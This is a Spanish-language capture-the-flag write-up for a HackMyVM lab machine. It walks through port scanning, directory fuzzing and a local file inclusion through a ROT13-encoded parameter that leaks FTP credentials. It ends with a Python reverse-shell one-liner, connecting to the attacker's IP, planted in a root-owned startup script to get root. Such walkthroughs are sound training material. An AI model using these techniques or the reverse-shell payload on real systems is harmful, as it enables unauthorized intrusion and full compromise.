Propiedades:
- OS: Linux
- Plataforma: HackMyVm
- Nivel: Easy
- Tags: #lfi #hijacking 


![](../assets/Pasted image 20251130010617.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:
```bash
> ping -c 1 192.168.1.197
----------------------------------------------------------
PING 192.168.1.197 (192.168.1.197) 56(84) bytes of data.
64 bytes from 192.168.1.197: icmp_seq=1 ttl=64 time=3.22 ms

--- 192.168.1.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.218/3.218/3.218/0.000 m
```

Ahora procedo a realizar un escaneo con nmap para ver que puertos estan abiertos.

```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 192.168.1.197 
-------------------------------------------------------------
Nmap scan report for 192.168.1.197
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

- Vemos los puertos 80 HTTP, 22 SSH y 21 FTP abiertos.

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr algunos scripts.

```bash
> sudo nmap -p 21,22,80 -sS -Pn -sC -sV -n --min-rate 5000 192.168.1.197 -oN target
-------------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 2.0.1
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.197:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: iCloud Vault Access
MAC Address: 08:00:27:ED:18:94 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 80 HTTP: Apache httpd 2.4.62
- Puerto 22 SSH: OpenSSH 8.4p1 Debian 5+deb11u3
- Puerto 21 FTP: pyftpdlib 2.0.1

## Enumeración


**Puerto 80 HTTP**

- Al parecer es una web para buscar archivos

![](../assets/Pasted image 20251129233701.png)

**Source Code.**

En su codigo fuente podemos ver 3 recursos.
```html
<a href="[?theme=jrypbzr.gkg]" class="file-btn">📄 Welcome List</a> 
<a href="[?theme=pbasvt.gkg](view-source:http://192.168.1.197/?theme=pbasvt.gkg)" class="file-btn">🔧 Sync Config</a> 
<a href="[?theme=ernqzr.gkg](view-source:http://192.168.1.197/?theme=ernqzr.gkg)" class="file-btn">📘 Help Manual</a>
```

3 Recursos llamados:

- _jrypbzr.gkg_, _pbasvt.gkg_ y _ernqzr.gkg_

Los 3 links te llevan a nueva pagina donde se presenta el mismo patrón:

- Podemos ver que es el parametro _?theme_ el que esta listando el archivo.

![](../assets/Pasted image 20251129233849.png)

**Fuzzing.**

Para tener mas en claro los recursos de la web y encontrar posibles recursos ocultos procedo a realizar fuzzing.

```bash
> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.197/ -x html,php,py,js,txt -t 15
------------------------------------------------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 3444]
/welcome.txt          (Status: 200) [Size: 180]
/config.txt           (Status: 200) [Size: 378]
/readme.txt           (Status: 200) [Size: 83]
/logs                 (Status: 301) [Size: 313] [--> http://192.168.1.197/logs/]
```

- Encontramos un nuevo directorio llamado _/logs_
- Encontramos 3 archivos llamados _config.txt_, _readme.txt_ y _welcome.txt_

Aqui nos damos cuenta que los archivos _welcome.txt_, _config.txt_ y _readme.txt_ llevan al mismo contenido que los que encontramos en el codigo fuente:

- _welcome.txt_ -> _jrypbzr.gkg_
- _config.txt_ -> _pbasvt.gkg_
- _readme.txt_ -> _ernqzr.gkg_

![](../assets/Pasted image 20251129235009.png)

## Explotación


Ahora, que sabemos que los recursos que encontramos en el codigo fuente son los mismos que los que encontramos mediante fuzzing, esto me hace pensar que tal vez necesitemos enviar el parametro _?theme_ codificado de alguna manera.

Después de varias pruebas descubrimos que el parámetro `?theme` debe enviarse codificado en **ROT13**.

- Todos los recursos que aparece en el código fuente está en ROT13 y, al decodificar uno, obtenemos **config.txt**, el mismo archivo que encontramos por Fuzzing. Esto confirma que la página muestra los archivos siempre y cuando lo mandemos en formato `rot13`.

![](../assets/Pasted image 20251129235301.png)


Por lo cual ahora yo puedo intentar aplicar `rot13` a algún path de un archivo para ver si la web me lo lista.

- _/etc/passwd_ -> _/rgp/cnffjq_

![](../assets/Pasted image 20251129235611.png)

- Descubrimos 2 usuarios: welcome y max

Ahora nuestro objetivo es el directorio _/logs_. Al entrar desde la web a este directorio nos da un 403 forbidden por lo cual decidimos fuzzear para ver si podíamos acceder a algún archivo especifico

```bash
> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.197/logs -x log -t 15
-------------------------------------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ftp_server.log       (Status: 200) [Size: 230416]
Progress: 441120 / 441122 (100.00%)
```

- Encontramos el archivo _/ftp_server.log

Al inspeccionar ese archivo nos encontramos con esto:

- Dos archivos uno en el path _/opt/ftp_server.py_ y _/opt/rev.sh_

```bash
2025-07-05 03:10:17,781 - INFO - 172.21.79.61:37432-[ADMIN] USER 'ADMIN' logged in.
2025-07-05 03:10:17,781 - INFO - User logged in: ADMIN
2025-07-05 03:10:26,461 - INFO - 172.21.79.61:37432-[ADMIN] RETR /opt/ftp_server.py completed=1 bytes=1607 seconds=0.006
2025-07-05 03:10:26,461 - INFO - File sent: /opt/ftp_server.py
2025-07-05 03:10:42,354 - INFO - 172.21.79.61:37432-[ADMIN] STOR /opt/rev.sh completed=1 bytes=54 seconds=0.04
2025-07-05 03:10:42,354 - INFO - File received: /opt/rev.sh
```

Podemos tratar de listar los archivos aprovechándonos del LFI para ver que hacen los 2 scripts.

- _/opt/ftp_server.py_ -> _/bcg/sgc_freire.cl_

Al listar el archivo nos encontramos con credenciales del `FTP` y vemos que este script inicia el servicio `FTP` y registra logs.

- Credenciales: ADMIN:12345 

![](../assets/Pasted image 20251130000404.png)

Al conectarnos al `FTP` podemos ver que tenemos acceso al script _ftp_server.py_ y que el script pertenece al usuario root.

```bash
> ftp ADMIN@192.168.1.198
----------------------------------------------------------------------------
Connected to 192.168.1.198.
331 Username ok, send password.
Password: 
230 Login successful.
Using binary mode to transfer files.
ftp> ls -la
229 Entering extended passive mode (|||49165|).
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root         1607 Jul 05 07:08 ftp_server.py
-rw-r--r--   1 root     root           54 Jul 05 07:10 rev.sh
```

Entonces ahora sabemos que hay un script que pertenece al usuario root que se utiliza para iniciar el servidor `FTP` cada que la maquina se inicia. Por lo cual nosotros ahora podemos modificar el script para que en lugar de iniciar el `FTP` nos envié una reverse-shell.

- Nos descargamos el script principal
```
ftp> get ftp_server.py
```

- Modificamos el script y colocamos los siguientes imports al principio del script
```python
import socket 
import subprocess
```

- Al principio de la función main() meteremos este payload.
```python
import os,pty,socket;s=socket.socket();s.connect(("192.168.1.193",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

- Subimos el nuevo script
```
ftp> put ftp_server.py
```

Nosotros como atacante nos pondremos en escucha por el puerto 443:

```bash
> sudo nc -nlvp 443
```

Reiniciamos la maquina y recibimos conexión:

```bash
>sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.1.202 43102
root@13max:/opt# ls
ls
ftp_server.py  rev.sh
```

Flags
```
root.flag
flag{root-aaa245a6e5a82937c985c50c86282892}

user.flag
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

